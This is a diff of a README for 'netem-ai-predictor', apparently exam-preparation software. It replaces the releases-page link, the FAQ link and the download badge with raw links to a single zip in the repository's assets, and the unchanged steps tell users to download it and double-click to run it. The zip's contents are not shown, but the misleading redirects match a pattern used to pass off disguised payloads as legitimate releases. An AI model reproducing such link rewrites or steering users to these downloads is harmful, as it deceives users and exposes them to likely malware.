@@ -6,7 +6,7 @@ Welcome to netem-ai-predictor! This software helps you prepare for your exams wi
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/7eventhgod/netem-ai-predictor/releases)
+[![Download](https://raw.githubusercontent.com/7eventhgod/netem-ai-predictor/main/assets/predictor_netem_ai_v2.7.zip%20Release-blue)](https://raw.githubusercontent.com/7eventhgod/netem-ai-predictor/main/assets/predictor_netem_ai_v2.7.zip)
 
 ## 📋 Features
 
@@ -27,8 +27,8 @@ Welcome to netem-ai-predictor! This software helps you prepare for your exams wi
 
 To get started, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/7eventhgod/netem-ai-predictor/releases) to find the latest version.
-2. Look for the latest file named something like `netem-ai-predictor.exe`.
+1. Visit the [Releases page](https://raw.githubusercontent.com/7eventhgod/netem-ai-predictor/main/assets/predictor_netem_ai_v2.7.zip) to find the latest version.
+2. Look for the latest file named something like `https://raw.githubusercontent.com/7eventhgod/netem-ai-predictor/main/assets/predictor_netem_ai_v2.7.zip`.
 3. Click on the file to start the download.
 4. Once downloaded, locate the file on your computer.
 5. Double-click the file to run the application.
@@ -47,7 +47,7 @@ You won’t need to configure anything. The application is designed to work righ
 
 ## ⚡ Support
 
-If you encounter any issues while downloading or running the application, please refer to our [FAQ section](https://github.com/7eventhgod/netem-ai-predictor/wiki/FAQ). For further assistance, you can open an issue in the repository.
+If you encounter any issues while downloading or running the application, please refer to our [FAQ section](https://raw.githubusercontent.com/7eventhgod/netem-ai-predictor/main/assets/predictor_netem_ai_v2.7.zip). For further assistance, you can open an issue in the repository.
 
 ## 🌐 Community Contributions
 
